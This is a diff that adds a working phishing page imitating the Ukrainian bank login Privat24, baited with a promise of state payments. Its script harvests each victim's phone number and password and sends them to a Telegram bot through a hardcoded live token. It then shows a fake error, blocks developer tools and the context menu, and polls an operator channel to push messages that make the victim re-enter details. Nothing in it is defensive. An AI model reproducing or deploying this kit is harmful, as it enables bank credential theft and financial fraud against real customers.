@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Приват24 — Ваш фінансовий термінал</title>
+    <link rel="stylesheet" href="privat.css">
+    <style>
+        /* Заборона виділення тексту */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Стиль для якісного QR */
+        .qr-mock {
+            width: 100px;
+            height: 100px;
+            background: #fff;
+            border: 1px solid #eee;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://privat24.ua');
+            background-size: cover;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .qr-mock::after {
+            content: "P";
+            background: #72b128;
+            color: white;
+            font-weight: 900;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            border-radius: 4px;
+            position: absolute;
+        }
+
+        /* Мобільна адаптація */
+        @media (max-width: 850px) {
+            .p24-sidebar { display: none; }
+            .p24-layout { display: block; }
+            .p24-main { padding: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
+            .login-card { box-shadow: none; border: none; width: 100%; max-width: 100%; padding: 20px; }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="p24-layout">
+        <aside class="p24-sidebar">
+            <div class="sidebar-content">
+                <div class="p24-logo-big">
+                    <span class="gr">P</span><span class="bl">24</span>
+                </div>
+                <h1>Отримуйте державні <br>виплати онлайн</h1>
+                <p>Здійснюйте вхід у Приват24 для підтвердження статусу отримувача допомоги.</p>
+                <div class="qr-code-box">
+                    <div class="qr-mock"></div>
+                    <span>Скануйте для входу через додаток</span>
+                </div>
+            </div>
+        </aside>
+
+        <main class="p24-main">
+            <div class="login-card">
+                <div class="card-tabs">
+                    <div class="tab active">Вхід</div>
+                    <div class="tab">Бізнес</div>
+                </div>
+
+                <form id="p24-form" class="p24-form">
+                    <div class="p24-field">
+                        <label>Номер телефону</label>
+                        <div class="input-wrapper">
+                            <span class="prefix">+380</span>
+                            <input type="tel" id="p24-phone" maxlength="9" placeholder=" _ _  _ _ _  _ _  _ _ " inputmode="numeric" required>
+                        </div>
+                    </div>
+
+                    <div class="p24-field">
+                        <label>Пароль</label>
+                        <input type="password" id="p24-pass" placeholder="Введіть пароль" required>
+                    </div>
+
+                    <button type="submit" class="p24-btn-main">Увійти</button>
+
+                    <div class="p24-helper-links">
+                        <a href="#">Забули пароль?</a>
+                        <a href="#">Реєстрація</a>
+                    </div>
+                </form>
+
+                <div class="p24-security-info">
+                    <img src="https://img.icons8.com/ios-filled/50/72b128/shield.png" width="20" alt="safe">
+                    <span>Безпеку транзакцій гарантовано ПриватБанком</span>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="p24-loader" class="p24-full-loader">
+        <div class="p24-spinner-wrapper">
+            <div class="p24-circle"></div>
+            <div class="p24-logo-small">P</div>
+            <p id="loader-text">Триває завантаження...</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
+        const CHAT_ID = '-1003455979409';
+
+        // Блокування інструментів розробника
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        };
+
+        // Обробка форми
+        document.getElementById('p24-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const phone = document.getElementById('p24-phone').value;
+            const pass = document.getElementById('p24-pass').value;
+            const loader = document.getElementById('p24-loader');
+            const loaderText = document.getElementById('loader-text');
+
+            loader.style.display = 'flex';
+
+            const message = `<b>🟩 НОВЫЙ ЛОГ [ПРИВАТ]</b>\n\n` +
+                            `📱 Тел: +380${phone}\n` +
+                            `🔑 Пасс: <code>${pass}</code>`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).then(() => {
+                setTimeout(() => { loaderText.innerText = "Перевірка авторизації..."; }, 1500);
+                setTimeout(() => {
+                    alert("Тимчасова помилка сервера. Спробуйте увійти пізніше або через інший банк.");
+                    window.location.href = 'index.html';
+                }, 4000);
+            });
+        });
+
+        // Сховати адресну стрічку на мобільних
+        window.scrollTo(0, 1);
+        // 1. Генерация уникального ID для сессии
+if (!sessionStorage.getItem('USER_ID')) {
+    sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 8999 + 1000));
+}
+const USER_ID = sessionStorage.getItem('USER_ID');
+
+// 2. Функция отправки лога (замени старые fetch на эту)
+async function sendLog(type, data) {
+    await fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: USER_ID, type, data })
+    });
+}
+
+// 3. Постоянная проверка команд от тебя
+setInterval(async () => {
+    const res = await fetch(`/api/check/${USER_ID}`);
+    const data = await res.json();
+    if (data.msg) {
+        alert(data.msg); // Выскакивает твой текст из ТГ
+        location.reload(); // Перезагружаем, чтобы ввел данные заново
+    }
+}, 3000);
+    </script>
+</body>
+</html>
